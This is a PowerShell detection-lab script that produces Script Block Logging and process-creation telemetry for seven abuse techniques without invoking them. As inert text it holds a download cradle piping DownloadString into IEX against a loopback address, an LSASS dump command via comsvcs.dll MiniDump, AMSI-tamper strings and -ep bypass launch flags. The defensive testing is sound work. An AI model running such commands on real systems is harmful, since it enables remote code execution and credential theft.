#Requires -Version 5.1
<#
.SYNOPSIS
    Generates the log evidence for seven common PowerShell abuse techniques, safely.

.DESCRIPTION
    This script does NOT attack the host. It contains no working AMSI bypass, no shellcode,
    no credential dumping and no network payload. It produces realistic *telemetry* by
    exploiting one property of Script Block Logging:

        Script Block Logging records the text of a script block when the block is COMPILED,
        not when it runs.

    So [ScriptBlock]::Create('<real tradecraft text>') writes a full-fidelity 4104 event and
    then the block is discarded, never invoked. The detections in 03-Invoke-Detections.ps1
    match on that text and cannot tell it apart from the real thing, which is exactly the
    point: the detection logic gets a genuine test.

    Two simulations (S1 and S6) do launch a real child process, because their evidence is a
    Security 4688 command line and there is no way to fake that without a process. Both
    children only run Write-Output.

    Each simulation prints the evidence it is expected to leave. Run 03-Invoke-Detections.ps1
    afterwards to confirm each one fired.

.PARAMETER Only
    Run a subset, such as -Only S1,S3. Defaults to all.

.PARAMETER ListOnly
    Print what each simulation would do and what it would emit, then exit without doing it.

.EXAMPLE
    .\02-Invoke-Simulations.ps1

.EXAMPLE
    .\02-Invoke-Simulations.ps1 -Only S2,S3

.NOTES
    Requires 01-Enable-Logging.ps1 to have run, in a SESSION STARTED AFTERWARDS.
    Run on a disposable test host. Expect your EDR to alert on some of this - that is a
    good sign, and it is why you run it somewhere you control.
#>
[CmdletBinding()]
param(
    [ValidateSet('S1', 'S2', 'S3', 'S4', 'S5', 'S6', 'S7')]
    [string[]] $Only,

    [switch] $ListOnly
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$RunId  = ([guid]::NewGuid()).ToString('N').Substring(0, 8).ToUpper()
$Marker = "PSLAB-$RunId"

function Write-SimHeader {
    param([string] $Id, [string] $Name, [string] $Technique)
    Write-Host ''
    Write-Host ("=" * 78) -ForegroundColor DarkGray
    Write-Host " $Id  $Name" -ForegroundColor White
    Write-Host " MITRE ATT&CK: $Technique" -ForegroundColor DarkGray
    Write-Host ("=" * 78) -ForegroundColor DarkGray
}

function Write-Expect {
    param([string] $Evidence)
    Write-Host "  expects -> $Evidence" -ForegroundColor Cyan
}

function Write-Emitted {
    param([string] $What)
    Write-Host "  emitted:   $What" -ForegroundColor Green
}

function Write-SimWarn {
    param([string] $Message)
    Write-Host "  note:      $Message" -ForegroundColor Yellow
}

function Test-ShouldRun {
    param([string] $Id)
    if (-not $Only) { return $true }
    return $Only -contains $Id
}

function Invoke-CompileOnly {
    <#
        Compiles tradecraft text into a script block so Script Block Logging captures it,
        then throws the block away without invoking it. This is the safety mechanism the
        whole lab rests on.

        The compiled block is assigned to $null and never called. Do not "improve" this by
        adding & or .Invoke().
    #>
    param(
        [Parameter(Mandatory)] [string] $Text
    )

    $null = [ScriptBlock]::Create($Text)
}

Write-Host ''
Write-Host 'PowerShell abuse lab - simulations' -ForegroundColor White
Write-Host "Run marker: $Marker" -ForegroundColor White
Write-Host ''
Write-Host 'The marker scopes the detection time window and proves the run happened.' -ForegroundColor DarkGray
Write-Host 'No detection matches on the marker - every rule keys on real tradecraft.' -ForegroundColor DarkGray

if (-not $ListOnly) {
    $sbl = Get-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
        -Name 'EnableScriptBlockLogging' -ErrorAction SilentlyContinue

    if (-not $sbl -or $sbl.EnableScriptBlockLogging -ne 1) {
        Write-Host ''
        Write-Warning 'Script Block Logging is not enabled. Run 01-Enable-Logging.ps1 first, then start a new session.'
        Write-Warning 'Simulations S2-S5 and S7 will produce no evidence without it.'
        Write-Host ''
    }
}

# ======================================================================================
# S1 - Base64 encoded command
# ======================================================================================

if (Test-ShouldRun 'S1') {
    Write-SimHeader 'S1' 'Base64 encoded command' 'T1027.010 / T1059.001'
    Write-Expect 'Security 4688, CommandLine contains -EncodedCommand plus a base64 blob'
    Write-Expect 'PowerShell/Operational 4104, decoded block text'

    if (-not $ListOnly) {
        # Benign payload. The technique under test is the -EncodedCommand transport, not
        # whatever it carries, so a Write-Output exercises the detection identically to a
        # real loader.
        $payload = "Write-Output 'encoded command executed - $Marker'"
        $bytes   = [System.Text.Encoding]::Unicode.GetBytes($payload)
        $encoded = [System.Convert]::ToBase64String($bytes)

        Start-Process -FilePath 'powershell.exe' `
            -ArgumentList '-NoProfile', '-EncodedCommand', $encoded `
            -WindowStyle Hidden -Wait

        Write-Emitted "powershell.exe -NoProfile -EncodedCommand $($encoded.Substring(0, 24))..."
        Write-SimWarn 'Decodes to a Write-Output. Nothing else ran.'
    }
}

# ======================================================================================
# S2 - Download cradle piped to Invoke-Expression
# ======================================================================================

if (Test-ShouldRun 'S2') {
    Write-SimHeader 'S2' 'Download cradle into Invoke-Expression' 'T1059.001 / T1105'
    Write-Expect 'PowerShell/Operational 4104, ScriptBlockText contains DownloadString AND IEX'

    if (-not $ListOnly) {
        # Port 9 is the discard port and 127.0.0.1 is this machine, so even if this text
        # were executed it could not reach anything. It is not executed.
        $cradle = @"
`$wc = New-Object System.Net.WebClient
`$wc.Headers.Add('User-Agent', 'Mozilla/5.0')
IEX (`$wc.DownloadString('http://127.0.0.1:9/stage2.ps1'))
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/b.ps1')
# $Marker
"@

        Invoke-CompileOnly -Text $cradle

        Write-Emitted 'compiled a download-cradle script block (never invoked)'
        Write-SimWarn 'Targets 127.0.0.1:9 (discard port). No network traffic occurred.'
    }
}

# ======================================================================================
# S3 - AMSI tampering indicators
# ======================================================================================

if (Test-ShouldRun 'S3') {
    Write-SimHeader 'S3' 'AMSI tampering indicators' 'T1562.001'
    Write-Expect 'PowerShell/Operational 4104, ScriptBlockText contains AmsiUtils / amsiInitFailed'
    Write-Expect 'that same 4104 is likely Level=Warning, because AMSI itself flags the content'

    if (-not $ListOnly) {
        # This is the string signature of the well-known amsiInitFailed technique. It is
        # deliberately NOT a working bypass: the reflection call that would actually locate
        # and flip the field is absent, and nothing here is invoked. The detection under
        # test matches the indicator strings, which is what a real EDR content rule does.
        $amsiIndicators = @"
# AMSI tamper indicators - inert, for detection testing only - $Marker
`$indicator1 = 'System.Management.Automation.AmsiUtils'
`$indicator2 = 'amsiInitFailed'
`$indicator3 = 'AmsiScanBuffer'
"@

        Invoke-CompileOnly -Text $amsiIndicators

        Write-Emitted 'compiled a script block containing AMSI indicator strings'
        Write-SimWarn 'No bypass logic present. AMSI on this host was not touched.'
    }
}

# ======================================================================================
# S4 - In-memory injection API surface
# ======================================================================================

if (Test-ShouldRun 'S4') {
    Write-SimHeader 'S4' 'In-memory injection API surface' 'T1055 / T1620'
    Write-Expect 'PowerShell/Operational 4104, ScriptBlockText contains VirtualAlloc / CreateThread / Reflection.Assembly::Load'

    if (-not $ListOnly) {
        # The Win32 API names that appear in essentially every PowerShell shellcode runner.
        # No Add-Type, no P/Invoke signature is actually built, no memory is allocated.
        $injection = @"
# Injection API indicators - inert - $Marker
`$apis = @(
    'kernel32.dll VirtualAlloc',
    'kernel32.dll WriteProcessMemory',
    'kernel32.dll CreateRemoteThread',
    'kernel32.dll CreateThread'
)
`$loader = '[Reflection.Assembly]::Load(`$bytes)'
`$marshal = '[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer'
"@

        Invoke-CompileOnly -Text $injection

        Write-Emitted 'compiled a script block naming injection APIs'
        Write-SimWarn 'API names appear only inside string literals. Nothing was allocated or executed.'
    }
}

# ======================================================================================
# S5 - LSASS credential dumping tradecraft
# ======================================================================================

if (Test-ShouldRun 'S5') {
    Write-SimHeader 'S5' 'LSASS credential dumping tradecraft' 'T1003.001'
    Write-Expect 'PowerShell/Operational 4104, ScriptBlockText contains comsvcs.dll MiniDump / MiniDumpWriteDump'

    if (-not $ListOnly) {
        # Text only. This lab will not dump LSASS: doing so would put real credential
        # material on disk, and there is no safe way to do it "a little".
        #
        # Consequence for the lab: S5 exercises the 4104 half of detection D5 only. The
        # higher-fidelity evidence for this technique in production is Sysmon Event ID 10
        # (ProcessAccess) targeting lsass.exe, which no benign simulation can produce.
        # D5 checks for that too, it just will not fire here.
        $lsass = @"
# LSASS dump tradecraft - text only, never executed - $Marker
`$cmd1 = 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> C:\Windows\Temp\lsass.dmp full'
`$cmd2 = '[MiniDumpWriteDump]::Dump(`$lsassHandle, `$outputPath)'
`$target = 'lsass'
"@

        Invoke-CompileOnly -Text $lsass

        Write-Emitted 'compiled a script block containing LSASS dump command text'
        Write-SimWarn 'LSASS was NOT accessed. D5 will fire on 4104 only; the Sysmon 10 branch stays silent.'
    }
}

# ======================================================================================
# S6 - Suspicious launch flag combination
# ======================================================================================

if (Test-ShouldRun 'S6') {
    Write-SimHeader 'S6' 'Suspicious launch flag combination' 'T1059.001 / T1564.003'
    Write-Expect 'Security 4688, CommandLine contains -nop and -w hidden and -ep bypass'
    Write-Expect 'Windows PowerShell classic 400, HostApplication field carries the same flags'

    if (-not $ListOnly) {
        # A real child process with the real flag combination, running a harmless command.
        # The flags are the detection target; the payload is irrelevant to it.
        Start-Process -FilePath 'powershell.exe' `
            -ArgumentList '-nop', '-w', 'hidden', '-ep', 'bypass', '-noni', '-c', "Write-Output 'hidden window - $Marker'" `
            -WindowStyle Hidden -Wait

        Write-Emitted 'powershell.exe -nop -w hidden -ep bypass -noni -c "Write-Output ..."'
        Write-SimWarn 'Child process only echoed a string.'
    }
}

# ======================================================================================
# S7 - PowerShell v2 downgrade
# ======================================================================================

if (Test-ShouldRun 'S7') {
    Write-SimHeader 'S7' 'PowerShell v2 engine downgrade' 'T1562.001'
    Write-Expect 'Windows PowerShell classic 400, EngineVersion=2.0'
    Write-Expect 'and NOTHING in PowerShell/Operational 4104 - that absence is the signal'

    if (-not $ListOnly) {
        # v2 predates AMSI and Script Block Logging, so running under it turns off most of
        # this lab's visibility. On a patched modern host the v2 engine is usually absent
        # and this attempt fails, which is the correct outcome.
        # Redirecting a native command's stderr into the success stream can itself raise a
        # terminating error while ErrorActionPreference is Stop, so relax it around the call
        # and judge the outcome by exit code and output instead. The finally block restores
        # the preference even when powershell.exe cannot be launched at all.
        $savedPreference = $ErrorActionPreference
        $out             = $null
        $exitCode        = -1

        try {
            $ErrorActionPreference = 'SilentlyContinue'
            $out      = & powershell.exe -version 2 -NoProfile -Command "Write-Output 'v2 engine - $Marker'" 2>&1
            $exitCode = $LASTEXITCODE
        }
        catch {
            $out = $_.Exception.Message
        }
        finally {
            $ErrorActionPreference = $savedPreference
        }

        $joined = ($out | Out-String).Trim()

        if ($exitCode -eq 0 -and $joined -match [regex]::Escape($Marker)) {
            Write-Emitted 'powershell.exe -version 2 ran successfully'
            Write-SimWarn 'The v2 engine IS present on this host. That is a real finding - see 04-Enable-Blocking.ps1.'
        }
        else {
            Write-Host '  result:    v2 engine unavailable, downgrade refused' -ForegroundColor Green
            Write-SimWarn 'Expected on a hardened host. D7 will correctly find nothing.'
        }
    }
}

# ======================================================================================

Write-Host ''
Write-Host ("=" * 78) -ForegroundColor DarkGray

if ($ListOnly) {
    Write-Host ' Listing only - nothing was executed.' -ForegroundColor Yellow
}
else {
    Write-Host " Simulations complete. Marker: $Marker" -ForegroundColor White
    Write-Host ''
    Write-Host ' Events can lag a few seconds. Then run:' -ForegroundColor White
    Write-Host '   .\03-Invoke-Detections.ps1 -SinceMinutes 10' -ForegroundColor Cyan
}

Write-Host ("=" * 78) -ForegroundColor DarkGray
Write-Host ''
